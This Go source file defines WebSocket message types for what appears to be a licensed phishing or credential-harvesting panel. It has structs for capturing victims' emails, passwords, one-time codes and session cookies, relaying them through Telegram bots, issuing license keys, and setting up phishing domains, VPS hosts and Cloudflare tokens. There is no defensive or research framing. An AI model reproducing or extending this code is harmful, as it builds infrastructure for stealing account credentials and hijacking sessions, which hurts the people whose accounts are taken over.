// Package ws defines WebSocket message types and structures for communication
// between the server and clients (admin and users).
// It includes message formats for authentication, credentials, cookies, and configuration updates.

package ws

type SocketMessage struct {
	Type string      `json:"type"` // "auth", "cred", "otp", "cookie", etc.
	Data interface{} `json:"data"` // Actual payload (dynamic)
}

// ───────────────────── AUTH / LINKING ─────────────────────

type AuthMessage struct {
	AuthKey   string `json:"auth,omitempty"`
	AdminName string `json:"name,omitempty"`
	UserID    string `json:"user_id,omitempty"`
	Role      string `json:"role"`
}

type LinkMessage struct {
	UserID string `json:"user_id"`
	Slug   string `json:"slug"`
	URL    string `json:"url"`
}

type RequestLink struct {
	UserID string `json:"user_id"`
}

type TelegramSettings struct {
	UserID   string `json:"user_id"`
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
}

type LicenseKey struct {
	UserID string `json:"user_id"`
	Key    string `json:"key"`
}

// ───────────────────── DATA CAPTURE ─────────────────────

type CredMessage struct {
	Key       string `json:"key"` // capture slug
	Email     string `json:"email"`
	Password  string `json:"password,omitempty"`
	OTP       string `json:"otp,omitempty"`
	UserAgent string `json:"ua,omitempty"`
	LocalTime string `json:"time,omitempty"`
}

type CookieMessage struct {
	Key     string   `json:"key"`
	Email   string   `json:"email"`
	Cookies []string `json:"cookies"` // stringified or JSON array of Set-Cookie values
}

// ───────────────────── ADMIN COMMANDS ─────────────────────

type NewKeyCommand struct {
	Key    string `json:"key"`
	ChatID string `json:"chat_id,omitempty"`
	BotID  string `json:"bot_id,omitempty"`
	Owner  string `json:"owner,omitempty"`
}

type ConfigMessage struct {
	Status             string `json:"status"`
	DomainRoot         string `json:"domain_root"`
	VPSServer          string `json:"vps_server"`
	CertEmail          string `json:"cert_email"`
	CloudflareAPIToken string `json:"cloudflare_api_token"`
}
